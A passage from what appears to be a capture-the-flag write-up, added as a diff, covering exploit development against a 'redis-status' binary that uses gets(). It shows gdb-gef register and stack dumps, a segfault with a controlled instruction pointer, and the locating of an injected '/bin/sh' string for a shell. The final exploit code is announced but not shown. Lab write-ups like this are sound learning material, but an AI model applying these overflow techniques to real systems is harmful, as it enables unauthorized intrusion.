@@ -678,6 +678,146 @@ On running it pauses
 
 I will then attach the process to gdb 
 
+```
+└─$ gdb-gef 
+GEF for linux ready, type `gef' to start, `gef config' to configure
+88 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
+gef➤  attach 135706
+Attaching to process 135706
+Reading symbols from /home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis-status...
+(No debugging symbols found in /home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis-status)
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
+Reading symbols from /usr/lib/debug/.build-id/4a/ff0f9d796e67d413e44f332edace9ac0ca2401.debug...
+Reading symbols from /lib64/ld-linux-x86-64.so.2...
+Reading symbols from /usr/lib/debug/.build-id/4f/536ac1cd2e8806aed8556ea7795c47404de8a9.debug...
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007f4b636430ed in __GI___libc_read (fd=0x0, buf=0x177a6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xfffffffffffffe00
+$rbx   : 0x00007f4b6371da80  →  0x00000000fbad2088
+$rcx   : 0x00007f4b636430ed  →  0x5b77fffff0003d48 ("H="?)
+$rdx   : 0x1000            
+$rsp   : 0x00007ffc2d24dc98  →  0x00007f4b635cd00e  →  <_IO_file_underflow+382> test rax, rax
+$rbp   : 0x00007f4b6371a5e0  →  0x0000000000000000
+$rsi   : 0x000000000177a6b0  →  0x0000000000000000
+$rdi   : 0x0               
+$rip   : 0x00007f4b636430ed  →  0x5b77fffff0003d48 ("H="?)
+$r8    : 0x179b000         
+$r9    : 0x21001           
+$r10   : 0x1000            
+$r11   : 0x246             
+$r12   : 0x00007f4b6371e850  →  0x00007f4b6371da80  →  0x00000000fbad2088
+$r13   : 0xd68             
+$r14   : 0x00007f4b637199e0  →  0x0000000000000000
+$r15   : 0xd68             
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffc2d24dc98│+0x0000: 0x00007f4b635cd00e  →  <_IO_file_underflow+382> test rax, rax        ← $rsp
+0x00007ffc2d24dca0│+0x0008: 0x0000000000000001
+0x00007ffc2d24dca8│+0x0010: 0x00007f4b63643190  →  0x5877fffff0003d48 ("H="?)
+0x00007ffc2d24dcb0│+0x0018: 0x000000000179b000
+0x00007ffc2d24dcb8│+0x0020: 0x00007f4b6371da80  →  0x00000000fbad2088
+0x00007ffc2d24dcc0│+0x0028: 0x00007f4b6371a5e0  →  0x0000000000000000
+0x00007ffc2d24dcc8│+0x0030: 0x00007f4b6371e850  →  0x00007f4b6371da80  →  0x00000000fbad2088
+0x00007ffc2d24dcd0│+0x0038: 0x00007f4b63548740  →  0x00007f4b63548740  →  [loop detected]
+─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f4b636430e7 <read+7>         je     0x7f4b63643100 <__GI___libc_read+32>
+   0x7f4b636430e9 <read+9>         xor    eax, eax
+   0x7f4b636430eb <read+11>        syscall 
+ → 0x7f4b636430ed <read+13>        cmp    rax, 0xfffffffffffff000
+   0x7f4b636430f3 <read+19>        ja     0x7f4b63643150 <__GI___libc_read+112>
+   0x7f4b636430f5 <read+21>        ret    
+   0x7f4b636430f6 <read+22>        cs     nop WORD PTR [rax+rax*1+0x0]
+   0x7f4b63643100 <read+32>        sub    rsp, 0x28
+   0x7f4b63643104 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
+─────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "redis-status", stopped 0x7f4b636430ed in __GI___libc_read (), reason: STOPPED
+───────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7f4b636430ed → __GI___libc_read(fd=0x0, buf=0x177a6b0, nbytes=0x1000)
+[#1] 0x7f4b635cd00e → _IO_new_file_underflow(fp=0x7f4b6371da80 <_IO_2_1_stdin_>)
+[#2] 0x7f4b635ce002 → __GI__IO_default_uflow(fp=0x7f4b6371da80 <_IO_2_1_stdin_>)
+[#3] 0x7f4b635c1f9d → _IO_gets(buf=0x7ffc2d24dd50 "")
+[#4] 0x401216 → main()
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ 
+```
+
+Then i'll press the enter key then send /bin/sh
+
+```
+└─$ python3 getaddr.py
+[+] Starting local process './redis-status': pid 136554
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+[*] Redis Uptime
+$ /bin/sh
+$ 
+```
+
+Back on gdb-gef i'll enter `c`
+
+```
+gef➤  c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000100400000 in ?? ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0000000000404048  →  0x0068732f6e69622f ("/bin/sh"?)
+$rbx   : 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
+$rcx   : 0x00007fbb330f4a80  →  0x00000000fbad2088
+$rdx   : 0x1               
+$rsp   : 0x00007fff45b40448  →  0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
+$rbp   : 0x636161706361616f ("oaacpaac"?)
+$rsi   : 0x1               
+$rdi   : 0x00007fbb330f6a20  →  0x0000000000000000
+$rip   : 0x100400000       
+$r8    : 0x000000000183f7d9  →  0x0000000000000000
+$r9    : 0x0               
+$r10   : 0x00007fbb32f3ac00  →  0x0010002200001aa2
+$r11   : 0x202             
+$r12   : 0x0               
+$r13   : 0x00007fff45b40548  →  0x00007fff45b42398  →  "COLORFGBG=15;0"
+$r14   : 0x0               
+$r15   : 0x00007fbb33150020  →  0x00007fbb331512e0  →  0x0000000000000000
+$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fff45b40448│+0x0000: 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"       ← $rsp
+0x00007fff45b40450│+0x0008: 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
+0x00007fff45b40458│+0x0010: 0x00c0ae67faca6f46
+0x00007fff45b40460│+0x0018: 0x0000000000000000
+0x00007fff45b40468│+0x0020: 0x00007fff45b40548  →  0x00007fff45b42398  →  "COLORFGBG=15;0"
+0x00007fff45b40470│+0x0028: 0x0000000000000000
+0x00007fff45b40478│+0x0030: 0x00007fbb33150020  →  0x00007fbb331512e0  →  0x0000000000000000
+0x00007fff45b40480│+0x0038: 0xff3e250ff2a86f46
+─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x100400000
+─────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "redis-status", stopped 0x100400000 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ 
+```
+
+With this i'll search for the address out input /bin/sh is stored in the .data section
+
+```
+gef➤  x/s 0x000000000404048
+0x404048:       "/bin/sh"
+gef➤ 
+```
+
+Now that we have the address, here's the exploit 
+
 
 And we're done xD
 
